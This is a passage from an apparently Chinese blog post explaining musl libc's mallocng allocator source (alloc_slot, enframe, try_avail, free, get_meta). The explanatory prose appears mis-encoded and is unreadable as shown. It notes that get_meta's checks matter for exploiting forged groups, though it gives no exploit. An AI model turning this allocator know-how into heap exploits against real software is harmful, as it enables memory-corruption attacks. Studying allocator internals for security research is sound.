<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">alloc_slot</span><span class="params">(<span class="type">int</span> sc, <span class="type">size_t</span> req)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">uint32_t</span> first = try_avail(&amp;ctx.active[sc]);</span><br><span class="line">	<span class="keyword">if</span> (first) <span class="keyword">return</span> a_ctz_32(first);</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span> =</span> alloc_group(sc, req);</span><br><span class="line">	<span class="keyword">if</span> (!g) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">	g-&gt;avail_mask--;</span><br><span class="line">	<span class="built_in">queue</span>(&amp;ctx.active[sc], g);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å…¶ä¸­<code>try_avail</code>å‡½æ•°å°è¯•ä»è¯¥å¤§å°çš„<code>meta</code>ä¸­åˆ†é…å‡ºä¸€ä¸ªå¯ç”¨çš„chunkå¹¶è¿”å›ç´¢å¼•ï¼Œå¦‚æœè¯¥å¯ç”¨chunkä¸æ˜¯ç”±ä½äºé“¾é¦–çš„<code>meta</code>æ‰€æä¾›ï¼Œåˆ™ä¼šå°†è¿™ä¸ªchunkæ‰€åœ¨çš„metaç§»åŠ¨è‡³é“¾é¦–ã€‚å¦‚æœå°è¯•åˆ†é…æˆåŠŸï¼Œåˆ™è¿™é‡Œç›´æ¥è¿”å›ã€‚å¦åˆ™ï¼Œåé¢è°ƒç”¨<code>alloc_group</code>å‡½æ•°åˆ›å»ºä¸€ä¸ªæ–°çš„<code>meta</code>ï¼Œåˆ›å»ºæˆåŠŸåå°†å…¶ä¸­çš„ç¬¬ä¸€ä¸ªchunkçš„ç´¢å¼•ï¼ˆå³0ï¼‰è¿”å›ï¼Œå¹¶å°†è¯¥<code>meta</code>æ”¾åœ¨é“¾é¦–ã€‚ä¸è®ºå¦‚ä½•ï¼Œæœ€ç»ˆåªè¦èƒ½å¤Ÿæ‰§è¡Œåˆ°æ ‡å·<code>success</code>ï¼Œå°±ä¸€å®šèƒ½å¤Ÿè·å–åˆ°<code>idx</code>çš„å€¼ã€‚</p>
<p>æœ€åè¿”å›è°ƒç”¨äº†<code>enframe</code>å‡½æ•°ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> *<span class="title function_">enframe</span><span class="params">(<span class="keyword">struct</span> meta *g, <span class="type">int</span> idx, <span class="type">size_t</span> n, <span class="type">int</span> ctr)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">size_t</span> stride = get_stride(g);</span><br><span class="line">	<span class="type">size_t</span> slack = (stride-IB-n)/UNIT;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> *p = g-&gt;mem-&gt;storage + stride*idx;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> *end = p+stride-IB;</span><br><span class="line">	<span class="comment">// cycle offset within slot to increase interval to address</span></span><br><span class="line">	<span class="comment">// reuse, facilitate trapping double-free.</span></span><br><span class="line">	<span class="type">int</span> off = (p[<span class="number">-3</span>] ? *(<span class="type">uint16_t</span> *)(p<span class="number">-2</span>) + <span class="number">1</span> : ctr) &amp; <span class="number">255</span>;</span><br><span class="line">	assert(!p[<span class="number">-4</span>]);</span><br><span class="line">	<span class="keyword">if</span> (off &gt; slack) &#123;</span><br><span class="line">		<span class="type">size_t</span> m = slack;</span><br><span class="line">		m |= m&gt;&gt;<span class="number">1</span>; m |= m&gt;&gt;<span class="number">2</span>; m |= m&gt;&gt;<span class="number">4</span>;</span><br><span class="line">		off &amp;= m;</span><br><span class="line">		<span class="keyword">if</span> (off &gt; slack) off -= slack+<span class="number">1</span>;</span><br><span class="line">		assert(off &lt;= slack);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (off) &#123;</span><br><span class="line">		<span class="comment">// store offset in unused header at offset zero</span></span><br><span class="line">		<span class="comment">// if enframing at non-zero offset.</span></span><br><span class="line">		*(<span class="type">uint16_t</span> *)(p<span class="number">-2</span>) = off;</span><br><span class="line">		p[<span class="number">-3</span>] = <span class="number">7</span>&lt;&lt;<span class="number">5</span>;</span><br><span class="line">		p += UNIT*off;</span><br><span class="line">		<span class="comment">// for nonzero offset there is no permanent check</span></span><br><span class="line">		<span class="comment">// byte, so make one.</span></span><br><span class="line">		p[<span class="number">-4</span>] = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	*(<span class="type">uint16_t</span> *)(p<span class="number">-2</span>) = (<span class="type">size_t</span>)(p-g-&gt;mem-&gt;storage)/UNIT;</span><br><span class="line">	p[<span class="number">-3</span>] = idx;</span><br><span class="line">	set_size(p, end, n);</span><br><span class="line">	<span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™ä¸ªå‡½æ•°çš„ä¸»è¦ä½œç”¨æ˜¯ä»æŒ‡å®š<code>meta</code>ä¸­å–å‡ºæŒ‡å®šç´¢å¼•çš„<code>chunk</code>ã€‚</p>
<h2 id="try_availsrcmallocmallocngmallocc-line-114"><a class="markdownIt-Anchor" href="#try_availsrcmallocmallocngmallocc-line-114"></a> try_availï¼ˆ<code>/src/malloc/mallocng/malloc.c, line 114</code>ï¼‰</h2>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">uint32_t</span> <span class="title function_">try_avail</span><span class="params">(<span class="keyword">struct</span> meta **pm)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">m</span> =</span> *pm;</span><br><span class="line">	<span class="type">uint32_t</span> first;</span><br><span class="line">	<span class="keyword">if</span> (!m) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="type">uint32_t</span> mask = m-&gt;avail_mask;</span><br><span class="line">	<span class="keyword">if</span> (!mask) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!m) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">if</span> (!m-&gt;freed_mask) &#123;</span><br><span class="line">			dequeue(pm, m);</span><br><span class="line">			m = *pm;</span><br><span class="line">			<span class="keyword">if</span> (!m) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			m = m-&gt;next;</span><br><span class="line">			*pm = m;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		mask = m-&gt;freed_mask;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// skip fully-free group unless it&#x27;s the only one</span></span><br><span class="line">		<span class="comment">// or it&#x27;s a permanently non-freeable group</span></span><br><span class="line">		<span class="keyword">if</span> (mask == (<span class="number">2u</span>&lt;&lt;m-&gt;last_idx)<span class="number">-1</span> &amp;&amp; m-&gt;freeable) &#123;</span><br><span class="line">			m = m-&gt;next;</span><br><span class="line">			*pm = m;</span><br><span class="line">			mask = m-&gt;freed_mask;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// activate more slots in a not-fully-active group</span></span><br><span class="line">		<span class="comment">// if needed, but only as a last resort. prefer using</span></span><br><span class="line">		<span class="comment">// any other group with free slots. this avoids</span></span><br><span class="line">		<span class="comment">// touching &amp; dirtying as-yet-unused pages.</span></span><br><span class="line">		<span class="keyword">if</span> (!(mask &amp; ((<span class="number">2u</span>&lt;&lt;m-&gt;mem-&gt;active_idx)<span class="number">-1</span>))) &#123;</span><br><span class="line">			<span class="keyword">if</span> (m-&gt;next != m) &#123;</span><br><span class="line">				m = m-&gt;next;</span><br><span class="line">				*pm = m;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="type">int</span> cnt = m-&gt;mem-&gt;active_idx + <span class="number">2</span>;</span><br><span class="line">				<span class="type">int</span> size = size_classes[m-&gt;sizeclass]*UNIT;</span><br><span class="line">				<span class="type">int</span> span = UNIT + size*cnt;</span><br><span class="line">				<span class="comment">// activate up to next 4k boundary</span></span><br><span class="line">				<span class="keyword">while</span> ((span^(span+size<span class="number">-1</span>)) &lt; <span class="number">4096</span>) &#123;</span><br><span class="line">					cnt++;</span><br><span class="line">					span += size;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">if</span> (cnt &gt; m-&gt;last_idx+<span class="number">1</span>)</span><br><span class="line">					cnt = m-&gt;last_idx+<span class="number">1</span>;</span><br><span class="line">				m-&gt;mem-&gt;active_idx = cnt<span class="number">-1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		mask = activate_group(m);</span><br><span class="line">		assert(mask);</span><br><span class="line">		decay_bounces(m-&gt;sizeclass);</span><br><span class="line">	&#125;</span><br><span class="line">	first = mask&amp;-mask;</span><br><span class="line">	m-&gt;avail_mask = mask-first;</span><br><span class="line">	<span class="keyword">return</span> first;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ç»è¿‡æŸ¥æ‰¾ï¼Œè¿™ä¸ªå‡½æ•°åªåœ¨<code>alloc_slot</code>è¿™ä¸€å¤„è¢«è°ƒç”¨ï¼Œå‚æ•°å¡«çš„æ˜¯ä¸€ä¸ª<code>meta</code>é“¾è¡¨çš„é“¾é¦–åœ°å€æŒ‡é’ˆã€‚</p>
<p>è¿™ä¸ªå‡½æ•°çš„å‚æ•°æ˜¯<code>meta</code>çš„äºŒé‡æŒ‡é’ˆï¼Œé¦–å…ˆè§£å¼•ç”¨ä¸€å±‚è·å–åˆ°<code>meta</code>æŒ‡é’ˆï¼Œå¦‚æœè¿™ä¸ª<code>meta</code>æŒ‡é’ˆæ— æ•ˆï¼Œåˆ™è¿”å›0ã€‚</p>
<p>å¦‚æœè¯¥<code>meta</code>å­˜åœ¨ï¼Œåˆ™å–å‡ºå…¶<code>avail_mask</code>ã€‚å¦‚æœè¿™ä¸ªå€¼ä¸º0ï¼Œè¯´æ˜è¿™ä¸ª<code>meta</code>ä¸­å·²ç»æ²¡æœ‰å¯ä»¥ç”¨æ¥åˆ†é…çš„chunkäº†ã€‚è¿™å°±è¿›å…¥åˆ°å¤§ifè¯­å¥ä½“å†…ï¼š</p>
<p><strong><code>free_mask</code>ä¸<code>avail_mask</code>ç›¸åŒï¼Œä»¥æ¯”ç‰¹ä½æ ‡è¯†ï¼Œæ¯ä¸€ä¸ªæ¯”ç‰¹ä½è¡¨ç¤ºä¸€ä¸ªchunkæ˜¯å¦è¢«é‡Šæ”¾ã€‚å¦‚è¢«é‡Šæ”¾åˆ™æ¯”ç‰¹å€¼ä¸º1</strong>ã€‚<mark>å¦‚æœ<code>free_mask</code>ä¸º0</mark>ï¼Œè€Œæ­¤æ—¶<code>avail_mask</code>ä¹Ÿä¸º1ï¼Œè¯´æ˜è¿™ä¸ª<code>meta</code>ä¸­æ—¢ä¸èƒ½åˆ†é…<code>chunk</code>ï¼Œä¹Ÿæ²¡æœ‰å·²ç»é‡Šæ”¾çš„<code>chunk</code>ï¼Œè¿™ç§æƒ…å†µä¸‹åº”è¯¥å°†è¿™ä¸ª<code>meta</code>ä»é“¾è¡¨ä¸­ç§»é™¤ï¼Œå³è°ƒç”¨<code>dequeue</code>å‡½æ•°è„±é“¾ã€‚è„±é“¾ä¹‹å<code>pm</code>åº”è¯¥æŒ‡å‘æ–°çš„é“¾é¦–<code>meta</code>æŒ‡é’ˆã€‚å¦‚æœé“¾è¡¨ä¸­æ²¡æœ‰å…¶ä»–<code>meta</code>ï¼Œå°±è¿”å›0ã€‚<mark>å¦‚æœ<code>free_mask</code>ä¸ä¸º0</mark>ï¼Œåˆ™æ‰¾åˆ°ä¸‹ä¸€ä¸ª<code>meta</code>ï¼Œå¹¶å°†é“¾é¦–ä¿®æ”¹ä¸ºè¿™ä¸ª<code>meta</code>ã€‚</p>
<p>ä¹‹åæ£€æŸ¥æ–°é“¾é¦–<code>meta</code>ä¸­çš„chunkæ˜¯å¦å…¨éƒ¨è¢«é‡Šæ”¾ä¸”è¯¥<code>meta</code>ä¸æ˜¯ä¸å¯é‡Šæ”¾çš„ã€‚è¿™é‡Œçš„<code>mask == (2u&lt;&lt;m-&gt;last_idx)-1</code>å°±æ˜¯åœ¨åˆ¤æ–­<code>free_mask</code>çš„æ‰€æœ‰æœ‰æ•ˆçš„æ¯”ç‰¹æ˜¯ä¸æ˜¯å…¨ä¸º1ï¼Œå¦‚æœæ˜¯åˆ™è·³è¿‡è¯¥chunkå¹¶å†æ¬¡ä¿®æ”¹é“¾é¦–çš„<code>meta</code>ä¸ºä¸‹ä¸€ä¸ª<code>meta</code>ã€‚</p>
<p>ä¸‹é¢æ˜¯<code>if (!(mask &amp; ((2u&lt;&lt;m-&gt;mem-&gt;active_idx)-1)))</code>ï¼Œ<code>mask</code>æ˜¯é‡Šæ”¾chunkçš„æ©ç ï¼Œåé¢æ˜¯å…¨1çš„æ©ç ï¼Œå¦‚æœä¸¤è€…ç›¸ä¸ç­‰äº0ï¼Œè¯´æ˜è¿™ä¸ª<code>meta</code>ä¸­æ²¡æœ‰chunkè¢«é‡Šæ”¾ã€‚è¿™ä¸ªifè¯­å¥æ˜¯æƒ³è¦å°½å¯èƒ½åœ°ä½¿ç”¨å·²ç»æœ‰chunkè¢«é‡Šæ”¾çš„<code>meta</code>è€Œå°½å¯èƒ½ä¿ç•™å…¨éƒ¨chunkéƒ½å¯ä»¥ä½¿ç”¨çš„<code>meta</code>ï¼Œè¿™æ ·åšçš„ç›®çš„æ˜¯å‡å°‘è„é¡µé¢çš„äº§ç”Ÿã€‚å†…éƒ¨åˆ¤æ–­å¦‚æœè¿™ä¸ª<code>meta</code>ä¸æ˜¯ä»…æœ‰çš„ä¸€ä¸ª<code>meta</code>ï¼Œåˆ™ä½¿ç”¨ä¸‹ä¸€ä¸ª<code>meta</code>ï¼Œå¦åˆ™æ²¡åŠæ³•å°±åªèƒ½ä½¿ç”¨è¿™ä¸ªâ€œå¹²å‡€çš„â€<code>meta</code>ï¼Œelseä¸­æ‰€åšçš„æ˜¯åœ¨<code>group</code>ä¸­é€‰æ‹©ä¸€ä¸ªå¯ä»¥ä½¿ç”¨çš„chunkå¹¶è®¾ç½®ç›¸åº”æ§åˆ¶ä½ã€‚</p>
<p>å¾ªç¯å¤–é¢ï¼Œæ˜¯è®¾ç½®<code>meta</code>çš„<code>avail_mask</code>ä½ï¼Œå¹¶è¿”å›å°†è¦åˆ†é…å‡ºå»çš„chunkç´¢å¼•ã€‚</p>
<h2 id="freesrcmallocmallocngfreec-line-101"><a class="markdownIt-Anchor" href="#freesrcmallocmallocngfreec-line-101"></a> freeï¼ˆ<code>/src/malloc/mallocng/free.c, line 101</code>ï¼‰</h2>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">free</span><span class="params">(<span class="type">void</span> *p)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (!p) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span> =</span> get_meta(p);</span><br><span class="line">	<span class="type">int</span> idx = get_slot_index(p);</span><br><span class="line">	<span class="type">size_t</span> stride = get_stride(g);</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> *start = g-&gt;mem-&gt;storage + stride*idx;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> *end = start + stride - IB;</span><br><span class="line">	get_nominal_size(p, end);</span><br><span class="line">	<span class="type">uint32_t</span> self = <span class="number">1u</span>&lt;&lt;idx, all = (<span class="number">2u</span>&lt;&lt;g-&gt;last_idx)<span class="number">-1</span>;</span><br><span class="line">	((<span class="type">unsigned</span> <span class="type">char</span> *)p)[<span class="number">-3</span>] = <span class="number">255</span>;</span><br><span class="line">	<span class="comment">// invalidate offset to group header, and cycle offset of</span></span><br><span class="line">	<span class="comment">// used region within slot if current offset is zero.</span></span><br><span class="line">	*(<span class="type">uint16_t</span> *)((<span class="type">char</span> *)p<span class="number">-2</span>) = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// release any whole pages contained in the slot to be freed</span></span><br><span class="line">	<span class="comment">// unless it&#x27;s a single-slot group that will be unmapped.</span></span><br><span class="line">	<span class="keyword">if</span> (((<span class="type">uintptr_t</span>)(start<span class="number">-1</span>) ^ (<span class="type">uintptr_t</span>)end) &gt;= <span class="number">2</span>*PGSZ &amp;&amp; g-&gt;last_idx) &#123;</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">char</span> *base = start + (-(<span class="type">uintptr_t</span>)start &amp; (PGSZ<span class="number">-1</span>));</span><br><span class="line">		<span class="type">size_t</span> len = (end-base) &amp; -PGSZ;</span><br><span class="line">		<span class="keyword">if</span> (len) &#123;</span><br><span class="line">			<span class="type">int</span> e = errno;</span><br><span class="line">			madvise(base, len, MADV_FREE);</span><br><span class="line">			errno = e;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// atomic free without locking if this is neither first or last slot</span></span><br><span class="line">	<span class="keyword">for</span> (;;) &#123;</span><br><span class="line">		<span class="type">uint32_t</span> freed = g-&gt;freed_mask;</span><br><span class="line">		<span class="type">uint32_t</span> avail = g-&gt;avail_mask;</span><br><span class="line">		<span class="type">uint32_t</span> mask = freed | avail;</span><br><span class="line">		assert(!(mask&amp;self));</span><br><span class="line">		<span class="keyword">if</span> (!freed || mask+self==all) <span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">if</span> (!MT)</span><br><span class="line">			g-&gt;freed_mask = freed+self;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (a_cas(&amp;g-&gt;freed_mask, freed, freed+self)!=freed)</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	wrlock();</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mapinfo</span> <span class="title">mi</span> =</span> nontrivial_free(g, idx);</span><br><span class="line">	unlock();</span><br><span class="line">	<span class="keyword">if</span> (mi.len) &#123;</span><br><span class="line">		<span class="type">int</span> e = errno;</span><br><span class="line">		munmap(mi.base, mi.len);</span><br><span class="line">		errno = e;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>freeç”¨äºé‡Šæ”¾chunkï¼Œé¦–å…ˆéœ€è¦æ‰¾åˆ°è¯¥chunkæ‰€åœ¨çš„metaã€‚è¿™ä¸ªåŠŸèƒ½æ˜¯å¦‚ä½•å®ç°çš„å‘¢ï¼Ÿ</p>
<p>æ¯ä¸€ä¸ªchunkçš„å‰é¢éƒ½ä¿å­˜ç€è¿™ä¸ªchunkåœ¨<code>group</code>ä¸­çš„ç´¢å¼•ï¼Œé€šè¿‡<code>get_slot_index</code>å‡½æ•°æˆ‘ä»¬å°±å¯ä»¥çŸ¥é“ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span> <span class="title function_">get_slot_index</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *p)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> p[<span class="number">-3</span>] &amp; <span class="number">31</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å¯è§ç´¢å¼•å€¼ä¿å­˜åœ¨ç´¢å¼•ä¸º-3çš„ä½ç½®ã€‚</p>
<p>å¯¹äºç´¢å¼•å€¼ä¸ä¸º0çš„chunkï¼Œå…¶è¿˜æœ‰ä¸€ä¸ª<code>offset</code>ä¿å­˜åœ¨ç´¢å¼•ä¸º-2çš„ä½ç½®ï¼Œå®ƒè®°å½•äº†å½“å‰chunkä¸ç¬¬ä¸€ä¸ªchunké¦–éƒ¨çš„åç§»é‡ï¼ˆå³ç§»4ä½çš„ç»“æœï¼‰ï¼Œå› æ­¤é€šè¿‡è¿™ä¸ªå€¼æˆ‘ä»¬å¯ä»¥è®¡ç®—å‡ºè¯¥chunkæ‰€åœ¨<code>group</code>çš„é¦–åœ°å€ï¼Œç”±<code>group</code>ä¸­ä¿å­˜çš„<code>meta</code>åœ°å€æ‰¾åˆ°<code>meta</code>ã€‚åœ¨<code>get_meta</code>å‡½æ•°ä¸­ï¼Œæ‰¾åˆ°<code>meta</code>ååˆæ‰¾åˆ°äº†è¯¥<code>meta</code>æ‰€åœ¨çš„<code>meta_area</code>å¹¶è¿›è¡Œäº†å¤šé¡¹æ£€æŸ¥ï¼Œé˜²æ­¢<code>group</code>è¢«ä¼ªé€ ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦é€šè¿‡ä¼ªé€ groupæ¥è¿›è¡Œæ¼æ´åˆ©ç”¨ï¼Œå°±éœ€è¦ç‰¹åˆ«æ³¨æ„è¿™é‡Œï¼Œè¿™ä¸ªæˆ‘ä»¬ä»¥åå†è¯´ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /src/malloc/mallocng/meta.h, line 129</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="keyword">struct</span> meta *<span class="title function_">get_meta</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *p)</span></span><br><span class="line">&#123;</span><br><span class="line">	assert(!((<span class="type">uintptr_t</span>)p &amp; <span class="number">15</span>));</span><br><span class="line">	<span class="type">int</span> offset = *(<span class="type">const</span> <span class="type">uint16_t</span> *)(p - <span class="number">2</span>);</span><br><span class="line">	<span class="type">int</span> index = get_slot_index(p);</span><br><span class="line">	<span class="keyword">if</span> (p[<span class="number">-4</span>]) &#123;</span><br><span class="line">		assert(!offset);</span><br><span class="line">		offset = *(<span class="type">uint32_t</span> *)(p - <span class="number">8</span>);</span><br><span class="line">		assert(offset &gt; <span class="number">0xffff</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">base</span> =</span> (<span class="type">const</span> <span class="type">void</span> *)(p - UNIT*offset - UNIT);</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span> =</span> base-&gt;meta;</span><br><span class="line">	assert(meta-&gt;mem == base);</span><br><span class="line">	assert(index &lt;= meta-&gt;last_idx);</span><br><span class="line">	assert(!(meta-&gt;avail_mask &amp; (<span class="number">1u</span>&lt;&lt;index)));</span><br><span class="line">	assert(!(meta-&gt;freed_mask &amp; (<span class="number">1u</span>&lt;&lt;index)));</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">area</span> =</span> (<span class="type">void</span> *)((<span class="type">uintptr_t</span>)meta &amp; <span class="number">-4096</span>);</span><br><span class="line">	assert(area-&gt;check == ctx.secret);</span><br><span class="line">	<span class="keyword">if</span> (meta-&gt;sizeclass &lt; <span class="number">48</span>) &#123;</span><br><span class="line">		assert(offset &gt;= size_classes[meta-&gt;sizeclass]*index);</span><br><span class="line">		assert(offset &lt; size_classes[meta-&gt;sizeclass]*(index+<span class="number">1</span>));</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		assert(meta-&gt;sizeclass == <span class="number">63</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (meta-&gt;maplen) &#123;</span><br><span class="line">		assert(offset &lt;= meta-&gt;maplen*<span class="number">4096UL</span>/UNIT - <span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> (<span class="keyword">struct</span> meta *)meta;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>anywayï¼Œæ‹¿åˆ°äº†<code>meta</code>åœ°å€ä¹‹åï¼Œé€šè¿‡<code>get_stride</code>å‡½æ•°è·å–åˆ°å…¶ä¸­ä¿å­˜çš„chunkçš„å¤§å°ã€‚</p>
